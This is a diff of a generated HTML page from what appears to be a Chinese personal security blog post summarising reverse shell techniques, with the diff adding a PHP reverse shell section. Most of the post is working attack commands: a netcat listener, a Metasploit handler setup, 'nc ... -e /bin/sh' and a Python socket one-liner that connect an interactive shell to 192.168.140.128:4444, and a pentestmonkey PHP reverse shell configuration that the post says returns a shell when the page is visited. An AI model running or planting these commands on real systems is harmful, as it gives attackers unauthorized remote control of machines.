@@ -86,13 +86,13 @@
 
 
 
-<meta name="description" content="反弹shell姿势总结在Kali上开启监听使用 ncnc -lvp 4444 使用msf注意系统不同所使用的&#96;payload&#96;也不同,可根据&#96;uname -a&#96;查看系统内核信息     msfconsole     use exploits&#x2F;multi&#x2F;handler     set payload linux&#x2F;x64&#x2F;shell&#x2F;reverse_tcp     set lhost yourhos">
+<meta name="description" content="反弹shell姿势总结在Kali上开启监听使用 ncnc -lvp 4444 使用msf注意系统不同所使用的payload也不同,可根据uname -a查看系统内核信息 123456msfconsoleuse exploits&#x2F;multi&#x2F;handlerset payload linux&#x2F;x64&#x2F;shell&#x2F;reverse_tcpset lhost yourhostset lport yourpo">
 <meta name="keywords" content="shell">
 <meta property="og:type" content="article">
 <meta property="og:title" content="反弹shell姿势总结">
 <meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;11&#x2F;27&#x2F;bulldog&#x2F;index.html">
 <meta property="og:site_name" content="Tr3c4r">
-<meta property="og:description" content="反弹shell姿势总结在Kali上开启监听使用 ncnc -lvp 4444 使用msf注意系统不同所使用的&#96;payload&#96;也不同,可根据&#96;uname -a&#96;查看系统内核信息     msfconsole     use exploits&#x2F;multi&#x2F;handler     set payload linux&#x2F;x64&#x2F;shell&#x2F;reverse_tcp     set lhost yourhos">
+<meta property="og:description" content="反弹shell姿势总结在Kali上开启监听使用 ncnc -lvp 4444 使用msf注意系统不同所使用的payload也不同,可根据uname -a查看系统内核信息 123456msfconsoleuse exploits&#x2F;multi&#x2F;handlerset payload linux&#x2F;x64&#x2F;shell&#x2F;reverse_tcpset lhost yourhostset lport yourpo">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;reverseShell&#x2F;nc.png">
 <meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;reverseShell&#x2F;msf2.png">
@@ -100,7 +100,7 @@
 <meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;reverseShell&#x2F;nc3.png">
 <meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;reverseShell&#x2F;py.png">
 <meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;reverseShell&#x2F;py2.png">
-<meta property="og:updated_time" content="2019-11-27T12:47:03.671Z">
+<meta property="og:updated_time" content="2019-11-27T13:09:22.573Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;reverseShell&#x2F;nc.png">
 
@@ -354,7 +354,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  132
+                  199
                 </span>
               
 
@@ -392,15 +392,15 @@
 
       
         <h1 id="反弹shell姿势总结"><a href="#反弹shell姿势总结" class="headerlink" title="反弹shell姿势总结"></a>反弹shell姿势总结</h1><h2 id="在Kali上开启监听"><a href="#在Kali上开启监听" class="headerlink" title="在Kali上开启监听"></a>在<code>Kali</code>上开启监听</h2><h3 id="使用-nc"><a href="#使用-nc" class="headerlink" title="使用 nc"></a>使用 <code>nc</code></h3><pre><code>nc -lvp 4444</code></pre><p><img src="/images/reverseShell/nc.png" alt="ncshell"></p>
-<h3 id="使用msf"><a href="#使用msf" class="headerlink" title="使用msf"></a>使用<code>msf</code></h3><pre><code>注意系统不同所使用的`payload`也不同,可根据`uname -a`查看系统内核信息
-    msfconsole
-    use exploits/multi/handler
-    set payload linux/x64/shell/reverse_tcp
-    set lhost yourhost
-    set lport yourport
-    exploit</code></pre><p><img src="/images/reverseShell/msf2.png" alt="msf1"></p>
+<h3 id="使用msf"><a href="#使用msf" class="headerlink" title="使用msf"></a>使用<code>msf</code></h3><p>注意系统不同所使用的<code>payload</code>也不同,可根据<code>uname -a</code>查看系统内核信息</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploits/multi/handler</span><br><span class="line">set payload linux/x64/shell/reverse_tcp</span><br><span class="line">set lhost yourhost</span><br><span class="line">set lport yourport</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<p><img src="/images/reverseShell/msf2.png" alt="msf1"></p>
 <h3 id="使用python"><a href="#使用python" class="headerlink" title="使用python"></a>使用<code>python</code></h3><h2 id="发送shell"><a href="#发送shell" class="headerlink" title="发送shell"></a>发送<code>shell</code></h2><h3 id="使用nc"><a href="#使用nc" class="headerlink" title="使用nc"></a>使用<code>nc</code></h3><pre><code>nc 192.168.140.128 4444 -e /bin/sh</code></pre><p><img src="/images/reverseShell/nc2.png" alt="nc2"><br><img src="/images/reverseShell/nc3.png" alt="nc3"></p>
-<h3 id="使用python-1"><a href="#使用python-1" class="headerlink" title="使用python"></a>使用<code>python</code></h3><pre><code>python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.140.128&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</code></pre><p> <img src="/images/reverseShell/py.png" alt="py"><br> <img src="/images/reverseShell/py2.png" alt="py2"></p>
+<h3 id="使用python-1"><a href="#使用python-1" class="headerlink" title="使用python"></a>使用<code>python</code></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.140.128",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br></pre></td></tr></table></figure>
+<p> <img src="/images/reverseShell/py.png" alt="py"><br> <img src="/images/reverseShell/py2.png" alt="py2"></p>
+<h3 id="使用恶意脚本"><a href="#使用恶意脚本" class="headerlink" title="使用恶意脚本"></a>使用恶意脚本</h3><p>当目标存在<code>php</code>环境时<br>可使用<code>https://github.com/pentestmonkey/php-reverse-shell</code>  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">set_time_limit (<span class="number">0</span>);</span><br><span class="line">$VERSION = <span class="string">"1.0"</span>;</span><br><span class="line">$ip = <span class="string">'127.0.0.1'</span>;  <span class="comment">// CHANGE THIS</span></span><br><span class="line">$port = <span class="number">1234</span>;       <span class="comment">// CHANGE THIS</span></span><br><span class="line">$chunk_size = <span class="number">1400</span>;</span><br><span class="line">$write_a = <span class="keyword">null</span>;</span><br><span class="line">$error_a = <span class="keyword">null</span>;</span><br><span class="line">$shell = <span class="string">'uname -a; w; id; /bin/sh -i'</span>;</span><br><span class="line">$daemon = <span class="number">0</span>;</span><br><span class="line">$debug = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
+<p>修改上面的ip和端口,访问该页面就会反弹回来一个shell</p>
 
       
     </div>
@@ -582,7 +582,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#反弹shell姿势总结"><span class="nav-number">1.</span> <span class="nav-text">反弹shell姿势总结</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#在Kali上开启监听"><span class="nav-number">1.1.</span> <span class="nav-text">在Kali上开启监听</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#使用-nc"><span class="nav-number">1.1.1.</span> <span class="nav-text">使用 nc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用msf"><span class="nav-number">1.1.2.</span> <span class="nav-text">使用msf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用python"><span class="nav-number">1.1.3.</span> <span class="nav-text">使用python</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#发送shell"><span class="nav-number">1.2.</span> <span class="nav-text">发送shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#使用nc"><span class="nav-number">1.2.1.</span> <span class="nav-text">使用nc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用python-1"><span class="nav-number">1.2.2.</span> <span class="nav-text">使用python</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#反弹shell姿势总结"><span class="nav-number">1.</span> <span class="nav-text">反弹shell姿势总结</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#在Kali上开启监听"><span class="nav-number">1.1.</span> <span class="nav-text">在Kali上开启监听</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#使用-nc"><span class="nav-number">1.1.1.</span> <span class="nav-text">使用 nc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用msf"><span class="nav-number">1.1.2.</span> <span class="nav-text">使用msf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用python"><span class="nav-number">1.1.3.</span> <span class="nav-text">使用python</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#发送shell"><span class="nav-number">1.2.</span> <span class="nav-text">发送shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#使用nc"><span class="nav-number">1.2.1.</span> <span class="nav-text">使用nc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用python-1"><span class="nav-number">1.2.2.</span> <span class="nav-text">使用python</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用恶意脚本"><span class="nav-number">1.2.3.</span> <span class="nav-text">使用恶意脚本</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
@@ -625,7 +625,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">413</span>
+    <span title="Site words total count">480</span>
   
 </div>
 
